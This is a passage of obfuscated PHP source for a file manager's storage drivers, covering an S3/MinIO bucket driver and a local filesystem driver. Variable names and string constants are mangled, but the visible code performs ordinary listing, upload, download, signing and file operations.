(array_chunk($˜ò˜§ÂÇ, 1000) as $ÃÕ¡ßŞ) { $àŸ—çî = $this->client->deleteObjects($this->bucket, $ÃÕ¡ßŞ); if (!$àŸ—çî) { return !1; } } return !0; } public function rename($¿Êç³ÙÚ, $âßù×‹Ÿ) { return $this->renameObject($¿Êç³ÙÚ, $âßù×‹Ÿ); } public function listPath($Õˆ„Ÿë©, $æ¸‰¥ıš = false) { $ìÖõÖá =& $_SERVER[­õöî’–]; $ÔšÓõ· = $this->fileList($Õˆ„Ÿë©, $ìÖõÖá[8], !0); foreach ($ÔšÓõ·[$ìÖõÖá[82]] as $½ƒ“×Ä => $óòÚ¬ÔÓ) { $ÔšÓõ·[$ìÖõÖá[82]][$½ƒ“×Ä] = $this->folderInfo($óòÚ¬ÔÓ, $æ¸‰¥ıš, $óòÚ¬ÔÓ); } foreach ($ÔšÓõ·[$ìÖõÖá[83]] as $½ƒ“×Ä => $óòÚ¬ÔÓ) { $ÔšÓõ·[$ìÖõÖá[83]][$½ƒ“×Ä] = $this->fileInfo($óòÚ¬ÔÓ[$ìÖõÖá[32]], $æ¸‰¥ıš, $óòÚ¬ÔÓ); } return $ÔšÓõ·; } protected function infoChildren($İş”´§û, &$ô‰››ó) { $¾–¡ù°Ñ =& $_SERVER[­õöî’–]; $¡…â½¤œ = $this->fileList($İş”´§û, $¾–¡ù°Ñ[12], !0); $ô‰››ó[$¾–¡ù°Ñ[78]] += count($¡…â½¤œ[$¾–¡ù°Ñ[82]]); $ô‰››ó[$¾–¡ù°Ñ[77]] += count($¡…â½¤œ[$¾–¡ù°Ñ[83]]); foreach ($¡…â½¤œ[$¾–¡ù°Ñ[83]] as $ëï¾®Ÿ®) { if (!$ëï¾®Ÿ® || !$ëï¾®Ÿ®[$¾–¡ù°Ñ[76]]) { continue; } $ô‰››ó[$¾–¡ù°Ñ[76]] += $ëï¾®Ÿ®[$¾–¡ù°Ñ[76]]; } } private function fileInfo($“şÚ²Å­, $Øµ¦»’§ = false, $ ¨”İÌô = array()) { $›Ë¶åÄÅ =& $_SERVER[­õöî’–]; $£…ú°Åï = array($›Ë¶åÄÅ[32] => $this->pathThis($“şÚ²Å­), $›Ë¶åÄÅ[84] => $this->getPathOuter($“şÚ²Å­), $›Ë¶åÄÅ[33] => $›Ë¶åÄÅ[199], $›Ë¶åÄÅ[174] => $this->ext($“şÚ²Å­), $›Ë¶åÄÅ[76] => isset($ ¨”İÌô[$›Ë¶åÄÅ[76]]) ? $ ¨”İÌô[$›Ë¶åÄÅ[76]] : 0); if ($Øµ¦»’§) { return $£…ú°Åï; } $£…ú°Åï[$›Ë¶åÄÅ[200]] = $£…ú°Åï[$›Ë¶åÄÅ[85]] = 0; $£…ú°Åï[$›Ë¶åÄÅ[201]] = $£…ú°Åï[$›Ë¶åÄÅ[202]] = !0; if (empty($ ¨”İÌô)) { $ ¨”İÌô = $this->objectMeta($“şÚ²Å­); if (!$ ¨”İÌô) { return $£…ú°Åï; } } if (isset($ ¨”İÌô[$›Ë¶åÄÅ[203]])) { $£…ú°Åï[$›Ë¶åÄÅ[85]] = $ ¨”İÌô[$›Ë¶åÄÅ[203]]; } if (isset($ ¨”İÌô[$›Ë¶åÄÅ[76]])) { $£…ú°Åï[$›Ë¶åÄÅ[76]] = $ ¨”İÌô[$›Ë¶åÄÅ[76]]; } return $£…ú°Åï; } private function folderInfo($¬˜Ë­œ, $à¶ƒƒÚÙ = false, $¨Ö€÷¨ü = array()) { $™Ã‡˜è =& $_SERVER[­õöî’–]; $™Ñ¢‚¥· = array($™Ã‡˜è[32] => $this->pathThis($¬˜Ë­œ), $™Ã‡˜è[84] => $this->getPathOuter($™Ã‡˜è[8] . $¬˜Ë­œ), $™Ã‡˜è[33] => $™Ã‡˜è[75]); if ($à¶ƒƒÚÙ) { return $™Ñ¢‚¥·; } $™Ñ¢‚¥·[$™Ã‡˜è[200]] = $™Ñ¢‚¥·[$™Ã‡˜è[85]] = 0; $™Ñ¢‚¥·[$™Ã‡˜è[201]] = $™Ñ¢‚¥·[$™Ã‡˜è[202]] = !0; if ($¬˜Ë­œ == $™Ã‡˜è[12]) { return $™Ñ¢‚¥·; } if (empty($¨Ö€÷¨ü)) { $¨Ö€÷¨ü = $this->objectMeta(trim($¬˜Ë­œ, $™Ã‡˜è[8]) . $™Ã‡˜è[8]); } if (isset($¨Ö€÷¨ü[$™Ã‡˜è[203]])) { $™Ñ¢‚¥·[$™Ã‡˜è[200]] = $¨Ö€÷¨ü[$™Ã‡˜è[203]]; } return $™Ñ¢‚¥·; } private function fileList($»¦Ÿîîì, $»¦Û’ã° = '', $òÁËŠÏ = 0) { $à‘ËÆ¬ê =& $_SERVER[­õöî’–]; $Ü©»·Ü = rtrim($»¦Ÿîîì, $à‘ËÆ¬ê[8]) . $à‘ËÆ¬ê[8]; $Ù¬õÙ£ = $this->listObjs($Ü©»·Ü, null, null, $»¦Û’ã°); if (!$Ù¬õÙ£) { return array($à‘ËÆ¬ê[82] => array(), $à‘ËÆ¬ê[83] => array()); } $°¨ªö¡• = $ÉÖµà˜¸ = array(); foreach ($Ù¬õÙ£[$à‘ËÆ¬ê[204]] as $Ş¾¾í) { $¤ôñÕ×¶ = $Ş¾¾í[$à‘ËÆ¬ê[32]]; if ($¤ôñÕ×¶ == $Ü©»·Ü) { continue; } $ü˜İ»¶Ô = isset($Ş¾¾í[$à‘ËÆ¬ê[76]]) ? $Ş¾¾í[$à‘ËÆ¬ê[76]] : 0; $åíÀ³™¾ = $ü˜İ»¶Ô == 0 && substr($¤ôñÕ×¶, strlen($¤ôñÕ×¶) - 1, 1) == $à‘ËÆ¬ê[8] ? !0 : !1; $this->cacheMethodInfoSet($¤ôñÕ×¶, $åíÀ³™¾, $Ş¾¾í); if ($åíÀ³™¾) { $°¨ªö¡•[] = $¤ôñÕ×¶; continue; } $ÉÖµà˜¸[] = $òÁËŠÏ ? $Ş¾¾í : $¤ôñÕ×¶; } foreach ($Ù¬õÙ£[$à‘ËÆ¬ê[205]] as $Ş¾¾í) { $°¨ªö¡•[] = $Ş¾¾í[$à‘ËÆ¬ê[32]]; $this->cacheMethodInfoSet($Ş¾¾í[$à‘ËÆ¬ê[32]], !0); } $this->cacheMethodInfoSet($»¦Ÿîîì, !0); return array($à‘ËÆ¬ê[82] => $°¨ªö¡•, $à‘ËÆ¬ê[83] => $ÉÖµà˜¸); } private function listObjs($˜Ó¹Åá¦, $ìÎö°† = null, $ıÀ§¨— = null, $«˜áüÎ´ = null) { $š¶åÙ µ =& $_SERVER[­õöî’–]; $˜Ó¹Åá¦ = trim($˜Ó¹Åá¦, $š¶åÙ µ[8]); $Ä½ …¬ = empty($˜Ó¹Åá¦) && $˜Ó¹Åá¦ !== $š¶åÙ µ[197] ? $š¶åÙ µ[12] : $˜Ó¹Åá¦ . $š¶åÙ µ[8]; return $this->client->getBucket($this->bucket, $Ä½ …¬, $ìÎö°†, $ıÀ§¨—, $«˜áüÎ´, !0); } public function has($ñ‹‰ßìğ, $â¯¨²Ó = false, $öÆâœ‘Ÿ = true) { $ó¹„Ëû§ =& $_SERVER[­õöî’–]; $ñ‹‰ßìğ = trim($ñ‹‰ßìğ, $ó¹„Ëû§[8]); $Ï‚ö˜¦ = empty($ñ‹‰ßìğ) && $ñ‹‰ßìğ !== $ó¹„Ëû§[197] ? $ó¹„Ëû§[12] : $ñ‹‰ßìğ . $ó¹„Ëû§[8]; $å…›ãšˆ = null; $µİ€¥€÷ = 500; $ãèÒÕÄ = $ó¹„Ëû§[8]; $ÛÊŒÁ¥ = $à¯¼¨´± = array(); while (!0) { $±›ŞÈÃ° = $this->listObjs($ñ‹‰ßìğ, $å…›ãšˆ, $µİ€¥€÷, $ãèÒÕÄ); if (!$±›ŞÈÃ°) { break; } $å…›ãšˆ = $±›ŞÈÃ°[$ó¹„Ëû§[206]]; $Ÿ‚çÁûŠ = $±›ŞÈÃ°[$ó¹„Ëû§[204]]; $·ÉÙ¡ú¼ = $±›ŞÈÃ°[$ó¹„Ëû§[205]]; if (empty($Ÿ‚çÁûŠ) && empty($·ÉÙ¡ú¼)) { break; } if (count($Ÿ‚çÁûŠ) == 1 && $Ÿ‚çÁûŠ[0][$ó¹„Ëû§[32]] == $Ï‚ö˜¦) { break; } if ($â¯¨²Ó) { if (count($Ÿ‚çÁûŠ)) { $Ÿ‚çÁûŠ = array_column($Ÿ‚çÁûŠ, $ó¹„Ëû§[32]); $ÛÊŒÁ¥ = array_merge($ÛÊŒÁ¥, $Ÿ‚çÁûŠ); } if (count($·ÉÙ¡ú¼)) { $·ÉÙ¡ú¼ = array_column($·ÉÙ¡ú¼, $ó¹„Ëû§[32]); $à¯¼¨´± = array_merge($à¯¼¨´±, $·ÉÙ¡ú¼); } if ($å…›ãšˆ === null) { break; } continue; } if ($öÆâœ‘Ÿ) { if (!empty($Ÿ‚çÁûŠ)) { if (count($Ÿ‚çÁûŠ) > 1 || isset($Ÿ‚çÁûŠ[0][$ó¹„Ëû§[32]]) && $Ÿ‚çÁûŠ[0][$ó¹„Ëû§[32]] != $Ï‚ö˜¦) { return !0; } } } else { if (!empty($·ÉÙ¡ú¼)) { return !0; } } if ($å…›ãšˆ === null) { break; } } if ($â¯¨²Ó) { $ÛÊŒÁ¥ = array_diff($ÛÊŒÁ¥, array($Ï‚ö˜¦)); $ÛÊŒÁ¥ = count(array_unique($ÛÊŒÁ¥)); $à¯¼¨´± = count(array_unique($à¯¼¨´±)); return array($ó¹„Ëû§[207] => $ÛÊŒÁ¥, $ó¹„Ëû§[208] => $à¯¼¨´±); } return !1; } public function listAll($¹ˆ©”İÚ) { $ƒ°®çÚº =& $_SERVER[­õöî’–]; $ÊâÓŞÁı = $this->fileList($¹ˆ©”İÚ, $ƒ°®çÚº[12], !0); $ö¿åô¢ = array(); foreach ($ÊâÓŞÁı[$ƒ°®çÚº[83]] as $×ã£«ªÃ) { $ö¿åô¢[$×ã£«ªÃ[$ƒ°®çÚº[32]]] = $×ã£«ªÃ[$ƒ°®çÚº[76]]; } foreach ($ÊâÓŞÁı[$ƒ°®çÚº[82]] as $×ã£«ªÃ) { if (is_string($×ã£«ªÃ)) { $ö¿åô¢[$×ã£«ªÃ] = 0; } } return $this->listAllFiles($¹ˆ©”İÚ, array_keys($ö¿åô¢), $ö¿åô¢); } public function canRead($±Ê‚ œÇ) { $¤›§¢Ø =& $_SERVER[­õöî’–]; $”ó™¬Õ† = $this->client->getAccessControlPolicy($this->bucket, $±Ê‚ œÇ); if (!$”ó™¬Õ†) { return !1; } return in_array($”ó™¬Õ†, array($¤›§¢Ø[209], $¤›§¢Ø[210], $¤›§¢Ø[211])) ? !0 : !1; } public function canWrite($Úóğõ™£) { $Ü¿œ¼ÔÚ =& $_SERVER[­õöî’–]; $—†‹»ê» = $this->client->getAccessControlPolicy($this->bucket, $Úóğõ™£); if (!$—†‹»ê») { return !1; } return in_array($—†‹»ê», array($Ü¿œ¼ÔÚ[209], $Ü¿œ¼ÔÚ[210])) ? !0 : !1; } public function getContent($ñ»ê±¾š) { return $this->client->getObject($this->bucket, $ñ»ê±¾š); } public function setContent($á¥½›„Ø, $¥òİÎ¿ï = '', $ƒËÀ = false) { $³º¶£öË =& $_SERVER[­õöî’–]; $á¥½›„Ø = $ƒËÀ ? trim($á¥½›„Ø, $³º¶£öË[8]) . $³º¶£öË[8] : $á¥½›„Ø; $Ìæ€ìíÌ = get_file_mime(get_path_ext($á¥½›„Ø)); $çˆ†ŒĞ† = $this->client->putObject($¥òİÎ¿ï, $this->bucket, $á¥½›„Ø, $³º¶£öË[198], array(), $Ìæ€ìíÌ); if (!$çˆ†ŒĞ†) { return !1; } if ($ƒËÀ) { return !0; } $this->cacheMethod(null, null); $çˆ†ŒĞ† = $this->copyFile($á¥½›„Ø, $á¥½›„Ø, array($³º¶£öË[212] => $çˆ†ŒĞ†[$³º¶£öË[213]])); return $çˆ†ŒĞ† ? !0 : !1; } public function fileSubstr($¯íüûÊ, $ùÚÜ¥–Ã, $ã²Ñ÷ù°) { $™µçåÔ = $ùÚÜ¥–Ã + $ã²Ñ÷ù° - 1; return $this->client->getObject($this->bucket, $¯íüûÊ, array($_SERVER[­õöî’–][214] => "\142\x79\164\145\163\75{$ùÚÜ¥–Ã}\x2d{$™µçåÔ}")); } public function upload($ıõöŸ°Ÿ, $±ò Øğ, $ª·Ìûİ‚ = false, $ŞóÁå— = REPEAT_REPLACE) { $´ğÛ… =& $_SERVER[­õöî’–]; $·Ñî’¬Š = array($´ğÛ…[212] => @md5_file($±ò Øğ)); $œ¬ù¹«Ø = array($´ğÛ…[215] => get_file_mime(get_path_ext($ıõöŸ°Ÿ))); if (IO::size($±ò Øğ) <= 1024 * 1024 * 200) { $§‚™Œ— = $this->client->putObjectFile($±ò Øğ, $this->bucket, $ıõöŸ°Ÿ, $´ğÛ…[198], $·Ñî’¬Š, $œ¬ù¹«Ø); return !empty($§‚™Œ—) ? $this->getPathOuter($ıõöŸ°Ÿ) : !1; } $éİ£ˆõµ = $this->client->multiUploadObject($±ò Øğ, $this->bucket, trim($ıõöŸ°Ÿ, $´ğÛ…[8]), $·Ñî’¬Š, $œ¬ù¹«Ø); return $éİ£ˆõµ ? $this->getPathOuter($ıõöŸ°Ÿ) : !1; } public function download($ÏÀ€ß¿ò, $«”éæù) { if (!@is_dir($this->pathFather($«”éæù)) && !IO::mkdir($this->pathFather($«”éæù))) { return !1; } $’åÒ¥À¿ = $this->client->getObject($this->bucket, $ÏÀ€ß¿ò, array(), $«”éæù); return $’åÒ¥À¿ !== !1 ? $«”éæù : !1; } public function link($º”ªË‘Ì, $˜›ø™â’ = array()) { $©ªØñëİ =& $_SERVER[­õöî’–]; if ($this->signVer == $©ªØñëİ[216]) { return $this->client->getAuthenticatedURL($this->bucket, $º”ªË‘Ì, 3600 * 12, $˜›ø™â’); } return $this->client->getObjectUrl($this->accessKey, $this->secret, $this->bucket, trim($º”ªË‘Ì, $©ªØñëİ[8]), 3600 * 12, $this->region, array(), !0, $˜›ø™â’); } public function fileOut($š¢‘Ö±ª, $Ì­Ç§˜» = false, $‹”ÎÙ’¡ = false, $¤õİÜıÒ = '') { $¨ÕÈìÚµ =& $_SERVER[­õöî’–]; if ($this->isFileOutServer()) { return $this->fileOutServer($š¢‘Ö±ª, $Ì­Ç§˜», $‹”ÎÙ’¡, $¤õİÜıÒ); } if (!$‹”ÎÙ’¡) { $‹”ÎÙ’¡ = $this->pathThis($š¢‘Ö±ª); } $×ô×™Øü = get_file_mime(get_path_ext($‹”ÎÙ’¡)); if ($×ô×™Øü == $¨ÕÈìÚµ[217]) { return parent::fileOut($š¢‘Ö±ª, $Ì­Ç§˜», $‹”ÎÙ’¡, $¤õİÜıÒ); } $º¡¼øÂë = array($¨ÕÈìÚµ[218] => $×ô×™Øü); if ($Ì­Ç§˜») { $º¡¼øÂë[$¨ÕÈìÚµ[219]] = $¨ÕÈìÚµ[220] . rawurlencode($‹”ÎÙ’¡); } else { } $ë‚İÒÕ÷ = $this->link($š¢‘Ö±ª, $º¡¼øÂë); $this->fileOutLink($ë‚İÒÕ÷); } public function fileOutServer($ÁÇé¡¾¿, $”«Æ¡Ç£ = false, $È®½Í¿— = false, $µĞ‡—Ğ„ = '') { parent::fileOut($ÁÇé¡¾¿, $”«Æ¡Ç£, $È®½Í¿—, $µĞ‡—Ğ„); } public function fileOutImageServer($­˜µ¹Ïœ, $íóè‰© = 250) { parent::fileOutImage($­˜µ¹Ïœ, $íóè‰©); } public function hashMd5($ã»µÕüˆ, $á¨”ºµÍ = '') { $†üıÃë =& $_SERVER[­õöî’–]; $äûèµø€ = $this->objectMeta($ã»µÕüˆ); if (!$äûèµø€) { return !1; } $á¨”ºµÍ = $á¨”ºµÍ ? $á¨”ºµÍ : _get($äûèµø€, $†üıÃë[221]); $á¨”ºµÍ = $á¨”ºµÍ ? $á¨”ºµÍ : _get($äûèµø€, $†üıÃë[213], $†üıÃë[12]); return $á¨”ºµÍ; } public function uploadFormData($”²Äß‹, $æĞÖ°½ = 3600) { $‡ŞÑŠê÷ =& $_SERVER[­õöî’–]; $½™¦¸°­ = $this->pathFather($”²Äß‹); $ê¾¥Ÿ¸ = $this->client->getHttpUploadPostParams($this->bucket, $½™¦¸°­, $‡ŞÑŠê÷[198], $æĞÖ°½); return array_merge((array) $ê¾¥Ÿ¸, array($‡ŞÑŠê÷[181] => $this->getHost())); } public function multiUploadFormData($ÍÌÑ³´È, $ŠËçÎ”² = 3600) { $ÖçŒêï“ =& $_SERVER[­õöî’–]; $ù­úçğ = gmdate($ÖçŒêï“[222]); $Çò±òı™ = array(); $‰§šÒş² = $this->client->getUploadId($this->bucket, $ÍÌÑ³´È, $Çò±òı™); if (!$‰§šÒş²) { return !1; } return array($ÖçŒêï“[223] => $‰§šÒş², $ÖçŒêï“[181] => $this->getHost() . $ÖçŒêï“[8] . $this->pathEncode($ÍÌÑ³´È), $ÖçŒêï“[224] => $ù­úçğ, $ÖçŒêï“[94] => $ÍÌÑ³´È); } public function multiUploadAuthData($½ÜùÚ×, $ŞŸÅØº± = array()) { $Ÿ¯€Ç¹ø =& $_SERVER[­õöî’–]; $£Ó“ÎÅÄ = isset($ŞŸÅØº±[$Ÿ¯€Ç¹ø[224]]) ? $ŞŸÅØº±[$Ÿ¯€Ç¹ø[224]] : gmdate($Ÿ¯€Ç¹ø[222]); $½ÇÇ¨˜ = isset($ŞŸÅØº±[$Ÿ¯€Ç¹ø[174]]) ? $ŞŸÅØº±[$Ÿ¯€Ç¹ø[174]] : $Ÿ¯€Ç¹ø[12]; $µôäñˆá = $ŞŸÅØº±[$Ÿ¯€Ç¹ø[94]]; unset($ŞŸÅØº±[$Ÿ¯€Ç¹ø[94]]); if (isset($ŞŸÅØº±[$Ÿ¯€Ç¹ø[225]])) { $ŞŸÅØº±[$Ÿ¯€Ç¹ø[224]] = $£Ó“ÎÅÄ; return $this->listUploadParts($µôäñˆá, $ŞŸÅØº±); } $¤»öîúŒ = array($Ÿ¯€Ç¹ø[226], $Ÿ¯€Ç¹ø[12], $Ÿ¯€Ç¹ø[120], $Ÿ¯€Ç¹ø[12], "\x78\x2d\x61\x6d\x7a\55\x64\141\164\145\72{$£Ó“ÎÅÄ}", $Ÿ¯€Ç¹ø[8] . $this->bucket . $Ÿ¯€Ç¹ø[8] . $this->pathEncode($µôäñˆá) . $½ÇÇ¨˜); if (strpos($½ÇÇ¨˜, $Ÿ¯€Ç¹ø[227]) === 0) { $¤»öîúŒ[0] = $Ÿ¯€Ç¹ø[228]; } if (isset($ŞŸÅØº±[$Ÿ¯€Ç¹ø[229]]) && $ŞŸÅØº±[$Ÿ¯€Ç¹ø[229]] == $Ÿ¯€Ç¹ø[230]) { $¤»öîúŒ[0] = $Ÿ¯€Ç¹ø[230]; } $¤òÎ˜… = implode($Ÿ¯€Ç¹ø[231], $¤»öîúŒ); $äÌŠ¸Ôï = base64_encode(hash_hmac($Ÿ¯€Ç¹ø[232], $¤òÎ˜…, $this->secret, !0)); $ë¾“÷¡Ÿ = $Ÿ¯€Ç¹ø[233] . $this->accessKey . $Ÿ¯€Ç¹ø[4] . $äÌŠ¸Ôï; if (strpos($½ÇÇ¨˜, $Ÿ¯€Ç¹ø[227]) === 0) { return array($Ÿ¯€Ç¹ø[234] => $ë¾“÷¡Ÿ, $Ÿ¯€Ç¹ø[224] => $£Ó“ÎÅÄ); } return $ë¾“÷¡Ÿ; } public function listUploadParts($®‹çäÛÀ, $òü”Ú‘¶ = array()) { $«Â¬¡£ğ =& $_SERVER[­õöî’–]; $“‡’Åó† = str_replace($«Â¬¡£ğ[235], $«Â¬¡£ğ[12], $òü”Ú‘¶[$«Â¬¡£ğ[174]]); $•ÚÉÅ’‘ = $this->client->listParts($this->bucket, $®‹çäÛÀ, $“‡’Åó†); if (!$•ÚÉÅ’‘) { return !1; } unset($òü”Ú‘¶[$«Â¬¡£ğ[225]], $òü”Ú‘¶[$«Â¬¡£ğ[229]]); $òü”Ú‘¶[$«Â¬¡£ğ[94]] = $®‹çäÛÀ; $ô˜³Úª = $this->multiUploadAuthData($®‹çäÛÀ, $òü”Ú‘¶); if (empty($ô˜³Úª)) { return !1; } return array($«Â¬¡£ğ[234] => $ô˜³Úª, $«Â¬¡£ğ[224] => $òü”Ú‘¶[$«Â¬¡£ğ[224]], $«Â¬¡£ğ[236] => $•ÚÉÅ’‘); } public function getHost() { return parent::getHost() . $_SERVER[­õöî’–][8] . $this->bucket; } public function size($Œ“äœÏ) { $Öˆöùéı = $this->objectMeta($Œ“äœÏ); return $Öˆöùéı ? $Öˆöùéı[$_SERVER[­õöî’–][76]] : 0; } public function info($ãøçÇÊ˜) { if ($this->isFolder($ãøçÇÊ˜)) { return $this->folderInfo($ãøçÇÊ˜); } else { if ($this->isFile($ãøçÇÊ˜)) { return $this->fileInfo($ãøçÇÊ˜); } } return !1; } public function exist($üÜõÚ¿¥) { return $this->isFile($üÜõÚ¿¥) || $this->isFolder($üÜõÚ¿¥); } public function isFile($ó×“íÎç) { return !$this->isFolder($ó×“íÎç) && $this->objectMeta($ó×“íÎç); } public function isFolder($Áá¢œ‡) { return $this->cacheMethod($_SERVER[­õöî’–][165], $Áá¢œ‡); } protected function objectMeta($ßšÚØí°) { return $this->cacheMethod($_SERVER[­õöî’–][167], $ßšÚØí°); } protected function _objectMeta($ÊÙÚ¼“£) { $ñˆ°Èêİ =& $_SERVER[­õöî’–]; $ÊÙÚ¼“£ = rtrim($ÊÙÚ¼“£, $ñˆ°Èêİ[8]); try { $‹¨—¦ = $this->client->getObjectInfo($this->bucket, $ÊÙÚ¼“£); if (!isset($‹¨—¦[$ñˆ°Èêİ[221]]) && isset($‹¨—¦[$ñˆ°Èêİ[237]])) { $‹¨—¦[$ñˆ°Èêİ[221]] = $‹¨—¦[$ñˆ°Èêİ[237]]; } } catch (Exception $¡…Æøí£) { $‹¨—¦ = !1; } if (!$‹¨—¦) { } return $‹¨—¦; } protected function _isFolder($ÄİÄˆÈ±) { $’‚â‹Ã‹ =& $_SERVER[­õöî’–]; $ÄİÄˆÈ± = rtrim($ÄİÄˆÈ±, $’‚â‹Ã‹[8]); if ($ÄİÄˆÈ± == $’‚â‹Ã‹[12] || $ÄİÄˆÈ± == $’‚â‹Ã‹[8]) { return !0; } $à¬¿íüÂ = $this->client->getBucket($this->bucket, $ÄİÄˆÈ±, null, 1); if (empty($à¬¿íüÂ[$’‚â‹Ã‹[204]])) { return !1; } $ÇŞçŸã¸ = $à¬¿íüÂ[$’‚â‹Ã‹[204]][0][$’‚â‹Ã‹[32]]; return stripos($ÇŞçŸã¸, $ÄİÄˆÈ± . $’‚â‹Ã‹[8]) === 0 ? !0 : !1; if (substr($ÇŞçŸã¸, -1) == $’‚â‹Ã‹[8]) { return !0; } if (get_path_this($ÇŞçŸã¸) == get_path_this($ÄİÄˆÈ±)) { return !1; } return !0; } } class PathDriverMinIO extends PathDriverBaseS3 { public function __construct($ÍÑüƒÛ¤) { parent::__construct($ÍÑüƒÛ¤); $this->signatureVersion($_SERVER[­õöî’–][216]); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } } goto c…ÊÎ¿ˆÉŒ; bÀ¢­Œ’™»: class PathDriverLocal extends PathDriverBase { private $pathAuth; public function __construct() { parent::__construct(); $this->pathAuth = DEFAULT_PERRMISSIONS; } public function getPath($»¤½«ë¬) { if (substr($»¤½«ë¬, 0, 2) == $_SERVER[­õöî’–][1374]) { $»¤½«ë¬ = BASIC_PATH . substr($»¤½«ë¬, 2); } return $»¤½«ë¬; } public function iconvApp($§è¹ñõ‚) { $“¾¾Ñı‚ =& $_SERVER[­õöî’–]; global $config; return $this->iconvTo($§è¹ñõ‚, $config[$“¾¾Ñı‚[1372]], $config[$“¾¾Ñı‚[1371]]); } public function iconvSystem($±åÏòå) { $ü²Õ£Ó =& $_SERVER[­õöî’–]; global $config; return $this->iconvTo($±åÏòå, $config[$ü²Õ£Ó[1371]], $config[$ü²Õ£Ó[1372]]); } public function getPathOuter($ªÕ‘÷×Õ) { $Ñº£óâé =& $_SERVER[­õöî’–]; $äË–øÕ = $this->iconvApp($this->pathBase); $ªÕ‘÷×Õ = $this->iconvApp($ªÕ‘÷×Õ); if (substr($äË–øÕ, 0, 2) == $Ñº£óâé[1374]) { $äË–øÕ = BASIC_PATH . substr($äË–øÕ, 2); } if (substr($ªÕ‘÷×Õ, 0, 2) == $Ñº£óâé[1374]) { $ªÕ‘÷×Õ = BASIC_PATH . substr($ªÕ‘÷×Õ, 2); } $äË–øÕ = KodIO::clear($äË–øÕ); $ªÕ‘÷×Õ = KodIO::clear($ªÕ‘÷×Õ); $ªÕ‘÷×Õ = substr($ªÕ‘÷×Õ, strlen($äË–øÕ)); if (empty($this->pathDriver)) { return $ªÕ‘÷×Õ; } return $this->pathDriver . $Ñº£óâé[8] . ltrim($ªÕ‘÷×Õ, $Ñº£óâé[8]); } public function mkfile($øá‡¬èó, $Òü½Ä„õ = '', $½¨ƒîá‚ = REPEAT_RENAME) { $øá‡¬èó = $this->iconvSystem($øá‡¬èó); @touch($øá‡¬èó); if ($Òü½Ä„õ) { file_put_contents($øá‡¬èó, $Òü½Ä„õ); } @chmod($øá‡¬èó, $this->pathAuth); return is_file($øá‡¬èó) ? $this->getPathOuter($øá‡¬èó) : !1; } public function mkdir($ü€îîÂÅ, $ÏŸ…à—ä = REPEAT_SKIP) { $ü€îîÂÅ = $this->iconvSystem($ü€îîÂÅ); if (is_dir($ü€îîÂÅ)) { return $this->getPathOuter($ü€îîÂÅ); } @mkdir($ü€îîÂÅ, $this->pathAuth, !0); @chmod($ü€îîÂÅ, $this->pathAuth); return is_dir($ü€îîÂÅ) ? $this->getPathOuter($ü€îîÂÅ) : !1; } public function copyFile($‚İÁÍæ, $íÒŞÏ—ä) { $this->mkdir($this->pathFather($íÒŞÏ—ä)); $‚İÁÍæ = $this->iconvSystem($‚İÁÍæ); $íÒŞÏ—ä = $this->iconvSystem($íÒŞÏ—ä); $Ã’¶†’÷ = copy_64($‚İÁÍæ, $íÒŞÏ—ä); @chmod($íÒŞÏ—ä, $this->pathAuth); return $Ã’¶†’÷ ? $this->getPathOuter($íÒŞÏ—ä) : !1; } public function moveFile($€ÚßóÁ©, $äìÌªæŞ) { $this->mkdir($this->pathFather($äìÌªæŞ)); $€ÚßóÁ© = $this->iconvSystem($€ÚßóÁ©); $äìÌªæŞ = $this->iconvSystem($äìÌªæŞ); $™‚ô¼¬ = intval(@rename($€ÚßóÁ©, $äìÌªæŞ)); if (!$™‚ô¼¬) { if ($™‚ô¼¬ = intval(@copy_64($€ÚßóÁ©, $äìÌªæŞ))) { @unlink($€ÚßóÁ©); } } @chmod($äìÌªæŞ, $this->pathAuth); return $™‚ô¼¬ ? $this->getPathOuter($äìÌªæŞ) : !1; } public function movePath($¿³‚ŒŞ, $¤¿øÕ¹¶, $Çíïšé  = false) { $­¸íÍ­ı =& $_SERVER[­õöî’–]; $¿³‚ŒŞ = $this->iconvSystem($¿³‚ŒŞ); $¤¿øÕ¹¶ = $this->iconvSystem($¤¿øÕ¹¶); $„ğ­Œ¶Ô = rtrim($¤¿øÕ¹¶, $­¸íÍ­ı[8]) . $­¸íÍ­ı[8] . ($Çíïšé  ? $Çíïšé  : get_path_this($¿³‚ŒŞ)); if (file_exists($„ğ­Œ¶Ô)) { return !1; } $Î¾‰óğ = intval(@rename($¿³‚ŒŞ, $„ğ­Œ¶Ô)); $Î¾‰óğ = file_exists($„ğ­Œ¶Ô); return $Î¾‰óğ ? $this->getPathOuter($„ğ­Œ¶Ô) : !1; } public function delFile($É¤şñœ¢) { $É¤şñœ¢ = $this->iconvSystem($É¤şñœ¢); if (!@unlink($É¤şñœ¢)) { @chmod($É¤şñœ¢, $this->pathAuth); if (!@unlink($É¤şñœ¢)) { return !1; } } else { return !0; } } public function delFolder($¹¡öË Ò) { $‡Ì¿ÒÕ =& $_SERVER[­õöî’–]; $¹¡öË Ò = $this->iconvSystem($¹¡öË Ò); if (!is_dir($¹¡öË Ò)) { return !0; } if (!($áÙ»•°æ = opendir($¹¡öË Ò))) { return !1; } while (($Å¥ûÓ‚¬ = readdir($áÙ»•°æ)) !== !1) { if ($Å¥ûÓ‚¬ == $‡Ì¿ÒÕ[10] || $Å¥ûÓ‚¬ == $‡Ì¿ÒÕ[1381]) { continue; } $Ì³¿Â†¸ = $¹¡öË Ò . $‡Ì¿ÒÕ[8] . $Å¥ûÓ‚¬; if (is_file($Ì³¿Â†¸) || is_link($Ì³¿Â†¸)) { if (!unlink($Ì³¿Â†¸)) { chmod($Ì³¿Â†¸, $this->pathAuth); if (!unlink($Ì³¿Â†¸)) { return !1; } } } else { if (is_dir($Ì³¿Â†¸)) { chmod($Ì³¿Â†¸, $this->pathAuth); $Ì³¿Â†¸ = $this->iconvApp($Ì³¿Â†¸); if (!$this->delFolder($Ì³¿Â†¸)) { return !1; } } } } closedir($áÙ»•°æ); return rmdir($¹¡öË Ò); } public function rename($£åÈåŞ, $‹£œ Ÿ«) { $ùé×äÂ =& $_SERVER[­õöî’–]; $¨şàåâÃ = $this->fileNameAuto($this->pathFather($£åÈåŞ), $‹£œ Ÿ«); $¨şàåâÃ = $this->iconvSystem($¨şàåâÃ); $£åÈåŞ = $this->iconvSystem($£åÈåŞ); $Ïí°†å˜ = $this->pathFather($£åÈåŞ); $÷¦Âõí = rtrim($Ïí°†å˜, $ùé×äÂ[8]) . $ùé×äÂ[8] . $¨şàåâÃ; $Æ£¦œÍ = @rename($£åÈåŞ, $÷¦Âõí); $÷¦Âõí = $this->iconvApp($÷¦Âõí); return $Æ£¦œÍ ? 